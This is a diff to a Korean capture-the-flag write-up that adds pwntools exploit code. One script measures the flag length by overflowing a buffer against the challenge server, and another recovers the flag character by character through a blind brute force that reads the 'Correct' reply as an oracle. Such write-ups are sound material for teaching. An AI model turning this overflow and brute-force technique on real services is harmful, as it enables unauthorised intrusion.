@@ -50,13 +50,33 @@
 
 2. 플래그 전체 길이를 파악하기 위해 점진적으로 오버플로우 버퍼를 늘려가며 `Correct!` 응답이 반환되는 길이를 탐색하는 페이로드 구성.
 
+```python
+# ... (중략) ...
+for length in range(1, 50): 
+    p = remote(HOST, PORT)
+    
+    test_payload = b"A" * length
+    payload = test_payload + b"\x00" * (64 - len(test_payload)) + test_payload
+    
+    p.sendafter(b"What's the flag? ", payload)
+    response = p.recvall(timeout=0.5)
+    p.close()
+    
+    if b"Correct" in response:
+        flag_len = length
+        print(f"flag_length : {flag_len}")
+        break
+# ... (중략) ...        
+```
+
 3. 플래그의 끝자리(`}`)부터 시작하여, `local_a8` 영역을 덮어씌우는 패딩(`A`)의 길이를 1씩 줄여가며 한 글자씩 역순으로 참/거짓(Oracle)을 판별하는 블라인드 브루트 포스 스크립트 작성.
 
 ```python
 # ... (중략) ...
+found_flag = b"}" # 문제 설명에 명시된 "플래그는 DH{...} 형식" 조건을 활용
 
 for i in range(flag_len - 2, -1, -1):
-    for c in range(0x20, 0x7f):
+    for c in range(0x20, 0x7f):  # 문제 설명에 명시된 "printable ASCII 문자(0x20-0x7e)로만 이루어져 있다"는 조건을 활용
         guess_char = bytes([c])
         
         p = remote(HOST, PORT, level='error')
